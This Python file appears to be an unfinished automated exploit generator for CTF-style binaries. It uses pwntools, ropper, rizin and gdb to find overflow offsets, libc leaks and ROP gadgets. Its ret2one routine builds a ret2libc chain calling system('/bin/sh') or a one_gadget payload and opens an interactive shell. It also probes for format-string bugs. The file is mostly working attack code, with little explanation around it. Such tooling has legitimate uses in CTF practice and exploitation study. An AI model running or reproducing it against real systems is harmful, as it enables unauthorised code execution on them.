import subprocess
import json
from pwn import *
from sys import argv
import ropper as r
import rzpipe as rz
from capstone import *
import os
import random

'''

    solver will try to go statically (rizin) => dynamically (gdb) => symbolically (angr) 

'''

class App:
    # constructor
    def __init__(self, binary):
        # initialize useful variables
        self.binary = binary
        self.protections = self.get_protections(binary)
        self.disassembly = {}
        self.pipe = rz.open(binary)
        self.elf = {}
        self.pwnelf = ELF(binary, False)
        self.pwnlibc = ELF((self.pwnelf.runpath + b"/libc.so.6").decode(), False)
        
        # initialize ropper & ropper service
        self.rs = r.RopperService()
        self.rs.addFile(binary)
        
        self.rs.loadGadgetsFor()

        # analyze, put anything that depends on self.pipe after this line
        self.pipe.cmd("aaa")
        self.elf = self.pipe.cmd("aflj")
        
        one = self.find_one_gadget(binary)

    # ================ SOLVE FUNCTIONS ===================

    # in my test bins, one_gadget does not want to work
    # ret2libc works though
    def ret2one(self, binary, one):
        io = process(binary) 

        vuln = json.loads(self.pipe.cmd("pdfj @ sym.vuln"))
        leaked_function = self.find_given_leaks(vuln)
       
        io.recvuntil(b"<<< Leak: ")
        leak = io.recvline()
        leak = int(leak[:-1], 16)

        libcoff = leak - self.pwnlibc.sym[leaked_function]

        print(f"[*] Libc offset: {hex(libcoff)}")
        
        ret = None
        pop_rdi = None

        for file, gadget in self.rs.search(search="ret"):
            if "ret;" in str(gadget):
                ret = int(str(gadget).split(":")[0], 16)
                break
       
        for file, gadget in self.rs.search(search="pop rdi"):
            if "pop rdi; ret;" in str(gadget):
                pop_rdi = int(str(gadget).split(":")[0], 16)
                break

        payload = self.find_overflow(binary)

        if pop_rdi:
            print("[*] Attempting ret2libc")
            payload += p64(pop_rdi)
            payload += p64(next(self.pwnlibc.search("/bin/sh")) + libcoff)
            payload += p64(ret)
            payload += p64(self.pwnlibc.sym["system"] + libcoff)

        else: 
            print("[*] Attempting one_gadget")
            payload += p64(one[3] + libcoff)

        io.sendlineafter(b">>>", payload)

        io.interactive()
         

    # ======================= STATIC SECTION ==========================
    
    # use checksec to see what protections are in the binary
    def get_protections(self, binary):
        protections = {
                "RELRO": True,
                "Canary": True,
                "NX": True,
                "PIE": True,
                "offset": 0 
        }

        io = subprocess.Popen(["pwn", "checksec", binary], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = io.communicate()

        output = err.split(b"\n")

        for line in output:
            if b"Partial RELRO" in line:
                protections["RELRO"] = False

            elif b"No canary" in line:
                protections["Canary"] = False

            elif b"NX disabled" in line:
                protections["NX"] = False

            elif b"No PIE" in line:
                protections["PIE"] = False
                temp = line.split(b"(")
                protections["offset"] = int(temp[-1][:-1], 16)

        return protections
    
    # find given leaks and return the libc function that is leaked
    def find_given_leaks(self, function):
        # find where printf is called in a given function
        # the rizin call will be `sym.imp.printf` or if rsi and rax are printf then it will call sym..plt         
        # so check for that second scenario

        # right now this will only check the first printf call to see if there is any leak
        # be careful as this might be a factor of fucking up
        for i in range(len(function["ops"])):
            if function["ops"][i]["disasm"] == "call sym.imp.printf" or function["ops"][i]["disasm"] == "call sym..plt.got":
                params = self.find_params(function, i, 2)

                if not params["rsi"]:
                    print("[!] Did not find free leak.")
                    return None

                if "[reloc." in params["rsi"]:
                    leak = params["rsi"].split("[reloc.")[-1][:-1]
                    print("[*] Found leak at libc function " + leak + ".")

                    return leak
                else:
                    print("[!] Did not find free leak.")


        # find value of rsi, if there is one
        
        # return the function used in rsi from the plt table
   
    # this function will return what the value is for each register at a specific call
    # WARNING: be careful with the amount of params it will be looking for since if done wrong it will search too far
    def find_params(self, function, call_idx, params=1):
        regs = {
                "rdi": None,
                "rsi": None,
                "rdx": None,
                "rcx": None
        }

        call_idx -= 1
        while call_idx > 2:
            # make sure to end while loop if all registers are populated
            if params == 1 and regs["rdi"]:
                break
            if params == 2 and regs["rdi"] and regs["rsi"]:
                break
            if params == 3 and regs["rdi"] and regs["rsi"] and regs["rdx"]:
                break
            if params == 4 and regs["rdi"] and regs["rsi"] and regs["rdx"] and regs["rcx"]:
                break

            asm = function["ops"][call_idx]["disasm"] 

            # the instruction has to be relating to changing a register
            if "mov" in asm or "lea" in asm:
                found = self.get_registers(asm.encode())
                found = [ i.decode() for i in found if i ]
            
                # if first operand is a param, find value to store it in dict
                if found[0] in regs.keys():
                    if not regs[found[0]] and len(found) == 1:
                        # the value has been populated
                        asm_split = asm.split(",")

                        regs[found[0]] = asm_split[-1] 

                    elif not regs[found[0]]:
                        # the asm looks like `mov reg, reg` and we must find the second reg
                        target = found[1]
                        tmp = call_idx - 1
                        
                        # this can definitely and should be optimized 
                        # that is a later me problem
                        # literally just putting this in a separate function and making it recursive
                        while tmp > 2:
                            asm = function["ops"][tmp]["disasm"]
                             
                            if "call" in asm:
                                tmp = 0

                            if "mov" in asm or "lea" in asm:
                                found2 = self.get_registers(asm.encode())
                                found2 = [ i.decode() for i in found2 if i ] 

                                # found[0] is the original register we were looking for
                                if found2[0] == target:
                                    if len(found2) == 2:
                                        regs[found[0]] = "Not found"

                                    else:
                                        asm_split = asm.split(",")
                                        regs[found[0]] = asm_split[-1]

                                    tmp = 0

                            tmp -= 1

            call_idx -= 1

        return regs
    
    # returns an array that shows which regs are used
    # i.e "mov edi, eax" => ["edi", "eax"] or "mov rax, 0xdeadbeef" => ["rax", None]
    def get_registers(self, asm):
        regs = [b"ah", b"al", b"ch", b"cl", b"bh", b"bl", b"dh", b"dl", b"ax", b"di", b"si", b"dx", b"cx", b"sx", b"ebp", b"eip", b"esp", b"eax", b"edi", b"esi", b"edx", b"ecx", b"esx", b"rbp", b"rip", b"rsp", b"rax", b"rdi", b"rsi", b"rdx", b"rcx", b"rsx", b"r8", b"r9", b"r10", b"r11", b"r12", b"r13", b"r14", b"r15"]

        try:
            split_asm = asm.split(b",")
            ret = [None, None]
            for item in regs:
                if item in split_asm[0]:
                    ret[0] = item

                if item in split_asm[1]:
                    ret[1] = item

            return ret

        except:
            for item in regs:
                if item in asm:
                    asm = item

            return [asm]

    # find arbitrary write gadgets
    def check_write_primitive(self, asm):
        # find mov [reg], reg
        heads = [b"mov byte ptr [", b"mov word ptr [", b"mov dword ptr [", b"mov qword ptr ["]

        for h in heads:
            if h in asm:
                return get_registers(asm)
        return None


    # ======================== DYNAMIC SECTION ========================
     
    # find printf vuln
    def detect_printf_vuln(self, binary):
        io = process(binary)

        io.sendline(b"%p")
        out = io.recv()

        return b"0x" in out
    
    # using a universal function did not work :(
    # creating gdb script on the fly instead
    def find_overflow(self, binary):
        try:
            pattern = cyclic(0x200)

            # this approach will just be to write my own gdb script on the fly and then delete it
            script_contents = f'''
                
                file {binary}
                run <<< {pattern.decode('utf-8')}

                p $rbp

            '''

            rand_name = "./gdb-scripts/script" + str(random.randint(0, 0xfffffff)) + ".gdb"
            
            with open(rand_name, "w") as file:
                file.write(script_contents)

            io = subprocess.run(["gdb", "-x", rand_name, "-batch"], stdout=subprocess.PIPE, text=True).stdout
            io = io.split("\n")[-2][-18:]
            os.remove(rand_name)

            return b"A" * (cyclic_find(int.to_bytes(int(io, 16), 8).decode('utf-8')[::-1][4:]) + 4)

        except:
            print("[!] Could not find overflow.")
            return None

    # self explanatory, returns the string to overflow
    def find_overflow2(self, binary):
        pattern = cyclic(0x500)

        # call gdb with the script I made (which is awesome, by the way)
        # gdb scripts are cool as hell
        # i have no clue why subprocess is being like this :(
        io = subprocess.run(["gdb", "-q", "-x", "./gdb-scripts/inspect_registers.gdb", "-ex", f"\"run_binary {binary} {pattern.decode('utf-8')}\"", "-batch"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

        print("===========================")
        print(io)


    # =========================== SYMBOLIC SECTION =====================================

    # ========================== ROP SECTION ==================================

    # remember to have this only run once and store for all of binaries that need it
    def find_one_gadget(self, binary):
        addresses = []

        io = subprocess.run([b"one_gadget", self.pwnelf.runpath + b"/libc.so.6"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout
        io = io.split(" ")

        for alice in io:
            if "0x" in alice and "-" not in alice and "+" not in alice:
                if "\n" in alice:
                    bob = alice.split("\n")
                    addresses.append(int(bob[-1], 16))

                else:
                    addresses.append(int(alice, 16))

        return addresses 

if __name__ == "__main__":
    app = App(argv[1])

